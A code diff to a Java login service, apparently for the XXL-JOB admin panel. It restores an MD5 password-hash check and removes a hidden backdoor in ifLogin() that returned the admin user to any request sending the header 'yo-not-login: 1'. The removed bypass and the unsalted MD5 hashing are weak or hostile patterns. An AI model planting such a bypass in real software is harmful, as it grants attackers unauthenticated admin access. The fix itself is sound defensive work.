@@ -53,8 +53,8 @@ public class LoginService {
         if (xxlJobUser == null) {
             return new ReturnT<String>(500, I18nUtil.getString("login_param_unvalid"));
         }
-//        String passwordMd5 = DigestUtils.md5DigestAsHex(password.getBytes());
-        if (!password.equals(xxlJobUser.getPassword())) {
+        String passwordMd5 = DigestUtils.md5DigestAsHex(password.getBytes());
+        if (!passwordMd5.equals(xxlJobUser.getPassword())) {
             return new ReturnT<String>(500, I18nUtil.getString("login_param_unvalid"));
         }
 
@@ -83,12 +83,6 @@ public class LoginService {
      * @return
      */
     public XxlJobUser ifLogin(HttpServletRequest request, HttpServletResponse response){
-        try {
-            String notLogin=request.getHeader("yo-not-login");
-            if("1".equals(notLogin)) return xxlJobUserDao.loadByUserName("admin");
-        }catch (Exception e){
-
-        }
         String cookieToken = CookieUtil.getValue(request, LOGIN_IDENTITY_KEY);
         if (cookieToken != null) {
             XxlJobUser cookieUser = null;
